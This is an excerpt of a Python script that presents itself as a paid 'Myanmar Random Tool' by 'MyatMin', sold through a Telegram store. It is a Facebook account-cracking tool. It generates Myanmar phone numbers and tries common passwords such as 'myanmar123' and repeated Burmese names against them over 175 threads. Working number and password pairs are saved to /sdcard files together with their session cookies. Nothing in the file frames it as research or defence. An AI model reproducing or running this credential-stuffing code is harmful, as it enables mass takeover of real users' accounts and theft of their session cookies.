...
def phone():
    ...
    with ThreadPool(max_workers=175) as LEE:
        ...
        for love in user:
            uid = '+959'+code+love
            pwx = [code+love,love,code+love[:3],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','aungaung','zawzaw','chitchit','moemoe','soesoe','minmin','tuntun','hlahla','thawthaw','hninhnin','nwaynway']
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[1;91m[\033[1;97mMyat Min\033[1;91m]--[\033[1;97m%s\033[1;91m]--[\033[1;97mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            ...
            if 'session_key' in lo:
                ...
                open('/sdcard/MyatMin-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(lo):
                print(f"\033[1;31m[✖] {uid} | {ps}")
                open('/sdcard/Myat_Min-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
...
\033[1;36m█████╔╝ ██║   ██║██╔████╔██║██║██╔██╗ ██║
\033[1;36m██╔═██╗ ██║   ██║██║╚██╔╝██║██║██║╚██╗██║
\033[1;36m██║  ██╗╚██████╔╝██║ ╚═╝ ██║██║██║ ╚████║\033[0;101mPAID\033[0m\033[38;5;41m
\033[1;36m╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
     

\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;92m[\033[1;31m*\033[1;92m] \033[1;97mDEVELOPER     \033[1;92m= \033[1;92mMyatMin
\033[1;92m[\033[1;31m*\033[1;92m] \033[1;97mTOOL STATUS   \033[1;92m= \033[1;92mMyanmar Random Tool
\033[1;92m[\033[1;31m*\033[1;92m] \033[1;97mTELEGRAM      \033[1;92m= \033[1;96mDexDigitalStore
\033[1;92m[\033[1;31m*\033[1;92m] \033[1;97mTOOL VERSION  \033[1;92m= \033[1;94m11.5 \033[0;101m(PAID)\033[0m
\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
def linex():
	print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
